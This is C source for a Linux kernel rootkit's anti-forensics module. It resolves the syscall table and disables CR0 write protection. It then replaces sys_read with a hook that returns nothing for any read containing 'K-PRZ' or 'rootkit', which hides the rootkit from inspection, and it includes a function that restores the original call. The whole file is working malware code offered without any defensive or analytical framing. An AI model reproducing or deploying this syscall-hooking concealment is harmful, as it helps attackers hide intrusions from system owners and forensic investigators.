#include "memory_utils.h"
#include "anti_forensics.h"
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/kallsyms.h>

typedef asmlinkage ssize_t (*orig_read_t)(unsigned int, char __user *, size_t);

static unsigned long **syscall_table;
static orig_read_t real_sys_read;

static unsigned long **find_syscall_table(void) {
    return (unsigned long **)rk_resolve_symbol("sys_call_table");
}

static void disable_wp(void) {
    write_cr0(read_cr0() & (~0x10000));
}

static void enable_wp(void) {
    write_cr0(read_cr0() | 0x10000);
}

static asmlinkage ssize_t hooked_sys_read(unsigned int fd, char __user *buf, size_t count) {
    ssize_t ret;
    char *kbuf;

    ret = real_sys_read(fd, buf, count);
    if (ret <= 0)
        return ret;

    kbuf = kzalloc(ret + 1, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, buf, ret) == 0) {
        if (strnstr(kbuf, "K-PRZ", ret) || strnstr(kbuf, "rootkit", ret)) {
            kfree(kbuf);
            return 0;
        }
    }

    kfree(kbuf);
    return ret;
}

void setup_anti_forensics(void) {
    syscall_table = find_syscall_table();
    if (!syscall_table)
        return;

    real_sys_read = (orig_read_t)syscall_table[__NR_read];

    disable_wp();
    syscall_table[__NR_read] = (unsigned long *)hooked_sys_read;
    enable_wp();
}

void remove_anti_forensics(void) {
    if (!syscall_table)
        return;

    disable_wp();
    syscall_table[__NR_read] = (unsigned long *)real_sys_read;
    enable_wp();
}
